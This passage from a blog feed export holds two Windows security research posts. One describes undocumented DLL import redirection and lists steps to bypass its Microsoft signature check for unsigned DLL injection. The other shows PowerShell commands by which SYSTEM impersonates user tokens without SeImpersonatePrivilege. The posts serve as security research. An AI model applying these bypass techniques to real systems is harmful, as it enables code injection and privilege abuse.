margin-bottom: 0pt; margin-top: 0pt;\"><span>BOOL</span><span> CreateProcessInternalW(...) {</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPWSTR</span><span> RedirectionDllName = </span><span>NULL</span><span>;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> (!PackageBreakaway)</span><span>&nbsp;{</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BasepAppXExtension(PackageName, &amp;RedirectionDllName, ...);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;}</span></div><b id=\"docs-internal-guid-af52b7da-7fff-c7df-d3a8-d5f90d8a2e8b\"><br /></b><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>RTL_USER_PROCESS_PARAMETERS</span><span> Params = {};</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;BasepCreateProcessParameters(&amp;Params, ...);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> (RedirectionDllName) {</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RtlInitUnicodeString(</span><span>&amp;</span><span>Params-&gt;RedirectionDllName, RedirectionDllName);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;}</span></div><b><br /></b><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>// ...</span></div><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>}</span></div><div><span><br /></span></div>The value of <i>RedirectionDllName </i>is being retrieved from <i>BasepAppXExtension </i>which is used to get the configuration for packaged apps, such as those using Desktop Bridge. This made it likely it was a feature designed only for use with such applications. Every packaged application needs an XML manifest file, and the SDK comes with the full schema, therefore if it\u2019s an exposed option it\u2019ll be referenced in the schema.<br /><br />Searching for related terms I found the following inside <i>UapManifestSchema_v7.xsd</i>:<br /><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&lt;</span><span>xs:element</span><span> </span><span>name</span><span>=</span><span>\"</span><span>Properties</span><span>\"</span><span>&gt;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&lt;</span><span>xs:complexType</span><span>&gt;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&lt;</span><span>xs:all</span><span>&gt;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;</span><span>xs:element</span><span> </span><span>name</span><span>=</span><span>\"</span><span>ImportRedirectionTable</span><span>\"</span><span> </span><span>type</span><span>=</span><span>\"</span><span>t:ST_DllFile</span><span>\"</span><span>&nbsp;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>minOccurs</span><span>=</span><span>\"</span><span>0</span><span>\"</span><span>/&gt;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&lt;/</span><span>xs:all</span><span>&gt;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&lt;/</span><span>xs:complexType</span><span>&gt;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span id=\"docs-internal-guid-9573090c-7fff-07a1-a887-e6835aab7210\"><span>&lt;/</span><span>xs:element</span><span>&gt;</span></span></div><br />This fits exactly with what I was looking for. Specifically the Schema type is <i>ST_DllFile </i>which defined the allowed path component for a package relative DLL. Searching MSDN for the <i>ImportRedirectionTable </i>manifest value brought me to this <a href=\"https://docs.microsoft.com/en-us/uwp/schemas/appxpackage/uapmanifestschema/element-uap7-importredirectiontable\">link</a>. Interestingly though this was the only documentation. At least on MSDN I couldn\u2019t seem to find any further reference to it, maybe my Googlefu wasn\u2019t working correctly. However I did find a <a href=\"https://stackoverflow.com/questions/59135054/how-can-i-access-files-like-a-sqlite-database-outside-of-my-apps-folder-in-a\">Stack Overflow answer</a>, from a Microsoft employee no less, documenting it <b>*shrug*</b>. If anyone knows where the real documentation is let me know.<br /><br />With the SO answer I know how to implement it inside my own DLL. I need to define list of <i>REDIRECTION_FUNCTION_DESCRIPTOR </i>structures which define which function imports I want to redirect and the implementation of the forwarder function. The list is then exported from the DLL through a <i>REDIRECTION_DESCRIPTOR </i>structure as&nbsp; &nbsp;<i>__RedirectionInformation__</i>. For example the following will redirect <i>CreateProcessW </i>and always return <i>FALSE </i>(while printing a passive aggressive statement):<br /><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>BOOL</span><span> </span><span>WINAPI</span><span> CreateProcessWForwarder(</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPCWSTR</span><span> </span><span>lpApplicationName</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPWSTR</span><span> </span><span>lpCommandLine</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPSECURITY_ATTRIBUTES</span><span> </span><span>lpProcessAttributes</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPSECURITY_ATTRIBUTES</span><span> </span><span>lpThreadAttributes</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>BOOL</span><span> </span><span>bInheritHandles</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>DWORD</span><span> </span><span>dwCreationFlags</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPVOID</span><span> </span><span>lpEnvironment</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPCWSTR</span><span> </span><span>lpCurrentDirectory</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPSTARTUPINFOW</span><span> </span><span>lpStartupInfo</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>LPPROCESS_INFORMATION</span><span> </span><span>lpProcessInformation</span><span>)</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>{</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;printf(</span><span>\"No, I'm not running %ls\\n\"</span><span>, </span><span>lpCommandLine</span><span>);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>return</span><span> </span><span>FALSE</span><span>;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>}</span></div><b id=\"docs-internal-guid-ba8b5d74-7fff-5e59-be0c-6f2a17e1b8c6\"><br /></b><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>const</span><span> </span><span>REDIRECTION_FUNCTION_DESCRIPTOR</span><span> RedirectedFunctions[] =</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>{</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;{ </span><span>\"api-ms-win-core-processthreads-l1-1-0.dll\"</span><span>, </span><span>\"CreateProcessW\"</span><span>,&nbsp;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;CreateProcessWForwarder },</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>};</span></div><b><br /></b><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>extern</span><span> </span><span>\"C\"</span><span> </span><span>__declspec</span><span>(</span><span>dllexport</span><span>) </span><span>const</span><span> </span><span>REDIRECTION_DESCRIPTOR</span><span> __RedirectionInformation__ =</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>{</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>CURRENT_IMPORT_REDIRECTION_VERSION</span><span>,</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>ARRAYSIZE</span><span>(RedirectedFunctions),</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;RedirectedFunctions</span></div><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>};</span></div><div><span><br /></span></div>I compiled the DLL, added it to a packaged application, added the <i>ImportRedirectionTable </i>Manifest value and tried it out. It worked! This seems a perfect feature for something like Chrome as it\u2019s allows us to use a supported mechanism to hook imported functions without implementing hooks on <i>NtMapViewOfSection </i>and things like that. There are some limitations, it seems to not always redirect imports you think it should. This might be related to the mention in the SO answer that it only redirects imports directly in your applications dependency graph and doesn\u2019t support <i>GetProcAddress</i>. But you could probably live with that,<br /><br />However, to be useful in Chrome it obviously has to work outside of a packaged application. One obvious limitation is there doesn\u2019t seem to be a way of specifying this redirection DLL if the application is not packaged. Microsoft could support this using a new Process Thread Attribute, however I\u2019d expect the potential for abuse means they\u2019d not be desperate to do so.<br /><br />The initial code doesn\u2019t seem to do any checking for the packaged application state, so at the very least we should be able to set the <i>RedirectionDllName </i>value and create the process manually using <i>NtCreateUserProcess</i>. The problem was when I did the process initialization failed with <i>STATUS_INVALID_IMAGE_HASH</i>. This would indicate a check was made to verify the signing level of the DLL and it failed to load.<br /><br />Trying with any Microsoft signed binary instead I got <i>STATUS_PROCEDURE_NOT_FOUND</i> which would imply the DLL loaded but obviously the DLL I picked didn't export <i>__RedirectionInformation__</i>. Trying a final time with a non-Microsoft, but signed binary I got back to <i>STATUS_INVALID_IMAGE_HASH</i> again. It seems that outside of a packaged application we can only use Microsoft signed binaries. That\u2019s a shame, but oh well, it was somewhat inconvenient to use anyway.<br /><br />Before I go there are two further undocumented functions (AFAIK) the DLL can export.<br /><br /><span id=\"docs-internal-guid-ce99b545-7fff-36aa-7ac8-c1f04f902fec\"><span>BOOL</span><span> __ShouldApplyRedirection__(</span><span>LPWSTR</span><span> </span><span>DllName</span><span>)</span></span><br /><br />If this function is exported, you can disable redirection for individual DLLs based on the <i>DllName </i>parameter by returning <i>FALSE</i>.<br /><br /><span id=\"docs-internal-guid-387856da-7fff-af33-ac20-3f8bb134cba1\"><span>BOOL</span><span> __ShouldApplyRedirectionToFunction__(</span><span>LPWSTR</span><span> </span><span>DllName</span><span>, </span><span>DWORD</span><span> </span><span>Index</span><span>)</span></span><br /><br />This function allows you to disable redirection for a specific import on a DLL. Index is the offset into the redirection table for the matched import, so you can disable redirection for certain imports for certain DLLs.<br /><br />In conclusion, this is an interesting feature Microsoft added to Windows to support a niche edge case, and then seems to have not officially documented it. Nice! However, it doesn\u2019t look like it\u2019s useful for general purpose import redirection as normal applications require the file to be signed by Microsoft, presumably to prevent this being abused by malicious code. Also there's no trivial way to specify the option using <i>CreateProcess </i>and calling <i>NtCreateUserProcess </i>doesn't correctly initialize things like SxS and CSRSS connections.<br /><br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br />.<br /><br />Now if you\u2019ve bothered to read this far, I might as well admit you can bypass the signature check quite easily. Digging into where the DLL loading fails we find the following code inside&nbsp;<i>LdrpMapDllNtFileName</i>:<br /><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>if</span><span> ((LoadFlags &amp; 0x1000000) &amp;&amp; !NtCurrentPeb()-&gt;IsPackagedProcess)</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>{</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;status = LdrpSetModuleSigningLevel(FileHandle, 8);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;</span><span>if</span><span> (!</span><span>NT_SUCCESS</span><span>(status))</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>return</span><span> status;</span></div><span id=\"docs-internal-guid-ea26ccb5-7fff-5bac-11f3-168c98dcdcee\"></span><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>}</span></div><br />If you look back at the original call to LdrpLoadDll you'll notice that it was passing flag 0x1000000, which presumably means the DLL should be checked against a known signing level. The check is also disabled if the process is in a Packaged Process through a check on the PEB. This is why the load works in a Packaged Application, this check is just disabled. Therefore one way to get around the check would be to just use a Packaged App of some form, but that's not very convenient. You could try setting the flag manually by writing to the PEB, however that can result in the process not working too well afterwards (at least I couldn't get normal applications to run if I set the flag).<br /><br />What is&nbsp;<i>LdrpSetModuleSigningLevel </i>actually doing? Perhaps we can just bypass the check?<br /><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>NTSTATUS</span><span> LdrpSetModuleSigningLevel(</span><span>HANDLE</span><span> </span><span>FileHandle</span><span>, </span><span>BYTE</span><span> </span><span>SigningLevel</span><span>) {</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>DWORD</span><span> Flags;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>BYTE</span><span> CurrentLevel;</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>NTSTATUS</span><span> status = NtGetCachedSigningLevel(</span><span>FileHandle</span><span>, &amp;Flags, </span><span>&amp;</span><span>CurrentLevel);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> (</span><span>NT_SUCCESS</span><span>(status))</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;status = NtCompareSigningLevel(CurrentLevel, </span><span>SigningLevel</span><span>);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> (!</span><span>NT_SUCCESS</span><span>(status))</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;status = NtSetCachedSigningLevel(4, </span><span>SigningLevel</span><span>, </span><span>&amp;</span><span>FileHandle</span><span>);</span></div><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>return</span><span> status;</span></div><span id=\"docs-internal-guid-870a2318-7fff-9ee8-9d6f-005ca2dd5bd1\"></span><br /><div dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span>}</span></div><br />The code is using a the <i>NtGetCachedSigningLevel </i>and <i>NtSetCachedSigningLevel </i>system calls to use the kernel's Code Integrity module to checking the signing level. The signing level must be at least level 8, passing in from the earlier code, which corresponds to the \"Microsoft\" level. This ties in with everything we know, using a Microsoft signed DLL loads but a signed non-Microsoft one doesn't as it wouldn't be set to the Microsoft signing level.<br /><br />The cached signature checks have had multiple flaws before now. For example watch my UMCI presentation from <a href=\"https://www.offensivecon.org/speakers/2018/james-forshaw.html\">OffensiveCon</a>. In theory everything has been fixed for now, but can we still bypass it?<br /><br />The key to the bypass is noting that the process we want to load the DLL into isn't actually running with an elevated signing level, such as Microsoft only DLLs or Protected Process. This means the cached image section in the&nbsp;SECTION_OBJECT_POINTERS structure doesn't have to correspond to the file data on disk. This is effectively the same attack as the one in my <a href=\"https://googleprojectzero.blogspot.com/2017/08/bypassing-virtualbox-process-hardening.html\">blog on Virtual Box</a> (see section \"Exploiting Kernel-Mode Image Loading Behavior\").<br /><br />Therefore the attack we can perform is as follows:<br /><br />1. Copy unsigned Import Redirection DLL to a temporary file.<br />2. Open the temporary file for RWX access.<br />3. Create an image section object for the file then map the section into memory.<br />4. Rewrite the file with the contents of a Microsoft signed DLL.<br />5. Close the file and section handles, but do not unmap the memory.<br />6. Start a process specifying the temporary file as the DLL to load in the <i>RTL_USER_PROCESS_PARAMETERS </i>structure.<br />7. Profit?<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-RZnSi9COKwA/Xj7g7DxYA_I/AAAAAAAAEMo/CZ-WN7cQ9ogqvxlzG4Qh0snot1rYSLuDwCLcBGAsYHQ/s1600/dll_injection.PNG\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"Copy of CMD running with the CreateProcess hook installed.\" border=\"0\" height=\"318\" src=\"https://1.bp.blogspot.com/-RZnSi9COKwA/Xj7g7DxYA_I/AAAAAAAAEMo/CZ-WN7cQ9ogqvxlzG4Qh0snot1rYSLuDwCLcBGAsYHQ/s640/dll_injection.PNG\" title=\"\" width=\"640\" /></a></div><br />Of course if you're willing to write data to the new process you could just disable the check, but where's the fun in that :-)<br /><br />", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/3826444421053493549"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/3826444421053493549"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2020/02/dll-import-redirection-in-windows-10_8.html", "title": "DLL Import Redirection in Windows 10 1909"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}, "media_thumbnail": [{"url": "https://1.bp.blogspot.com/-RZnSi9COKwA/Xj7g7DxYA_I/AAAAAAAAEMo/CZ-WN7cQ9ogqvxlzG4Qh0snot1rYSLuDwCLcBGAsYHQ/s72-c/dll_injection.PNG", "height": "72", "width": "72"}], "href": ""}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-4142065737038055721", "guidislink": true, "link": "https://www.tiraniddo.dev/2020/01/dont-use-system-tokens-for-sandboxing.html", "published": "2020-01-29T22:40:00.001-08:00", "published_parsed": [2020, 1, 30, 6, 40, 0, 3, 30, 0], "updated": "2020-05-06T06:44:28.982-07:00", "updated_parsed": [2020, 5, 6, 13, 44, 28, 2, 127, 0], "tags": [{"term": "Impersonation", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Service", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Strange Behaviour", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Windows", "scheme": "http://www.blogger.com/atom/ns#", "label": null}], "title": "Don't Use SYSTEM Tokens for Sandboxing (Part 1 of N)", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Don't Use SYSTEM Tokens for Sandboxing (Part 1 of N)"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "This is just a quick follow on from my last post on <a href=\"https://www.tiraniddo.dev/2020/01/empirically-assessing-windows-service.html\">Windows Service Hardening</a>. I'm going to pick up on why you shouldn't use a SYSTEM token for a sandbox token. Specifically I'll describe an unexpected behavior when you mix the SYSTEM user and <i>SeImpersonatePrivilege</i>, or more specifically if you remove <i>SeImpersonatePrivilege</i>.<br /><br />As I mentioned in the last post it's possible to configure services with a limited set of privileges. For example you can have a service where you're only granted <i>SeTimeZonePrivilege </i>and every other default privilege is removed. Interestingly you can do this for any service running as SYSTEM. We can check what services are configured without <i>SeImpersonatePrivilege </i>with the following PS.<br /><br /><span>PS&gt; Get-RunningService -IncludeNonActive | ? { $_.UserName -eq \"LocalSystem\" -and $_.RequiredPrivileges.Count -gt 0 -and \"SeImpersonatePrivilege\" -notin $_.RequiredPrivileges }&nbsp;</span><br /><span><br /></span>On my machine that lists 22 services which are super secure and don't have <i>SeImpersonatePrivilege </i>configured. Of course the SYSTEM user is so powerful that surely it doesn't matter whether they have <i>SeImpersonatePrivilege </i>or not. You'd be right but it might surprise you to learn that for the most part SYSTEM doesn't need <i>SeImpersonatePrivilege </i>to impersonate (almost) any user on the computer.<br /><br />Let's see a diagram for the checks to determine if you're allowed to impersonate a Token. You might know it if you've seen any of my presentations, or read part 3 of <a href=\"https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-3.html\">Reading Your Way Around UAC</a>.<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-7LZ_TQrrc0Q/XjJwEJpq_rI/AAAAAAAAEKs/Ir_m0sWGrJo59UMV1a8oGrYVRn-XJ1vZACLcBGAsYHQ/s1600/Assign%2BImpersonation%2BToken.png\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"Impersonation FlowChat. Showing that there's an Origin Session Check.\" border=\"0\" height=\"332\" src=\"https://1.bp.blogspot.com/-7LZ_TQrrc0Q/XjJwEJpq_rI/AAAAAAAAEKs/Ir_m0sWGrJo59UMV1a8oGrYVRn-XJ1vZACLcBGAsYHQ/s640/Assign%2BImpersonation%2BToken.png\" title=\"\" width=\"640\" /></a></div><br />Actually this diagram isn't exactly like I've shown before I changed one of the boxes. Between the IL check and the User check I've added a box for \"Origin Session Check\". I've never bothered to put this in before as it didn't seem that important in the grand scheme. In the kernel call&nbsp;<i>SeTokenCanImpersonate </i>the check looks basically like:<br /><br /><span>if (proctoken-&gt;AuthenticationId ==&nbsp;</span><br /><span>&nbsp; &nbsp; imptoken-&gt;OriginatingLogonSession) {</span><br /><span><span style=\"white-space: pre;\"> </span>return STATUS_SUCCESS;</span><br /><span>}</span><br /><br />The check is therefore, if the current Process Token's Authentication ID matches the Impersonation Token's OriginatingLogonSession ID then allow impersonation. Where is&nbsp;<i>OriginatingLogonSession</i> coming from? The value is set when an API such as <i>LogonUser </i>is used, and is set to the Authentication ID of the Token calling the API. This check allows a user to&nbsp;get back a Token and impersonate it even if it's a different user which would normally be blocked by the user check. Now what Token authenticates all new users? SYSTEM does, therefore almost every Token on the system has an&nbsp;<i>OriginatingLogonSession</i> value set to the Authentication ID of the SYSTEM user.<br /><br />Not convinced? We can test it from an admin PS shell. First create a SYSTEM PS shell from an Administrator PS shell using:<br /><br /><span>PS&gt; Start-Win32ChildProcess powershell</span><br /><br />Now in the SYSTEM PS shell check the current Token's Authentication ID (yes I know <i>Pseduo </i>is a typo ;-)).<br /><br /><span>PS&gt;&nbsp;$(Get-NtToken -Pseduo).AuthenticationId</span><br /><span><br /></span><span>LowPart HighPart</span><br /><span>------- --------</span><br /><span>&nbsp; &nbsp; 999&nbsp; &nbsp; &nbsp; &nbsp; 0</span><br /><br />Next remove&nbsp;<i>SeImpersonatePrivilege&nbsp;</i>from the Token:<br /><br /><span>PS&gt; Remove-NtTokenPrivilege SeImpersonatePrivilege</span><br /><br />Now pick a normal user token, say from Explorer and dump the Origin.<br /><br /><span>PS&gt; $p = Get-NtProcess -Name explorer.exe</span><br /><span>PS&gt; $t = Get-NtToken -Process $p -Duplicate</span><br /><span>PS&gt; $t.Origin</span><br /><span><br /></span><span>LowPart HighPart</span><br /><span>------- --------</span><br /><span>&nbsp; &nbsp; 999&nbsp; &nbsp; &nbsp; &nbsp; 0</span><br /><br />As we can see the Origin matches the SYSTEM Authentication ID. Now try and impersonate the Token and check what the resultant impersonation level assigned was:<br /><br /><span>PS&gt; Invoke-NtToken $t {$(Get-NtToken -Impersonation -Pseduo).ImpersonationLevel}</span><br /><span>Impersonation</span><br /><br />We can see the final line shows the impersonation level as <i>Impersonation</i>. If we'd been blocked impersonating the Token it'd be set to <i>Identification</i> level instead.<br /><br />If you think I've made a mistake we can force failure by trying to impersonate a SYSTEM token but at a higher IL. Run the following to duplicate a copy of the current token, reduce IL to High then test the impersonation level.<br /><br /><span>PS&gt; $t = Get-NtToken -Duplicate</span><br /><span>PS&gt; Set-NtTokenIntegrityLevel High</span><br /><span>PS&gt; Invoke-NtToken $t {$(Get-NtToken -Impersonation -Pseduo).ImpersonationLevel}</span><br /><span>Identification</span><br /><br />As we can see, the level has been set to <i>Identification</i>. If <i>SeImpersonatePrivilege </i>was being granted we'd have been able to impersonate the higher IL token as the privilege check is before the IL check.<br /><br />Is this ever useful? One place it might come in handy is if someone tries to sandbox the SYSTEM user in some way. As long as you meet all the requirements up to the Origin Session Check, especially IL, then you can still impersonate other users even if that's been stripped away. This should work even in AppContainers or Restricted as the check for sandbox tokens happens after the session check.<br /><br />The take away from this blog should be:<br /><br /><ul><li>Removing <i>SeImpersonatePrivilege </i>from SYSTEM services is basically pointless.</li><li>Never try create a sandboxed process which uses SYSTEM as the base token as you can probably circumvent all manner of security checks including impersonation.</li></ul><br /><br /><br />"}], "summary": "This is just a quick follow on from my last post on <a href=\"https://www.tiraniddo.dev/2020/01/empirically-assessing-windows-service.html\">Windows Service Hardening</a>. I'm going to pick up on why you shouldn't use a SYSTEM token for a sandbox token. Specifically I'll describe an unexpected behavior when you mix the SYSTEM user and <i>SeImpersonatePrivilege</i>, or more specifically if you remove <i>SeImpersonatePrivilege</i>.<br /><br />As I mentioned in the last post it's possible to configure services with a limited set of privileges. For example you can have a service where you're only granted <i>SeTimeZonePrivilege </i>and every other default privilege is removed. Interestingly you can do this for any service running as SYSTEM. We can check what services are configured without <i>SeImpersonatePrivilege </i>with the following PS.<br /><br /><span>PS&gt; Get-RunningService -IncludeNonActive | ? { $_.UserName -eq \"LocalSystem\" -and $_.RequiredPrivileges.Count -gt 0 -and \"SeImpersonatePrivilege\" -notin $_.RequiredPrivileges }&nbsp;</span><br /><span><br 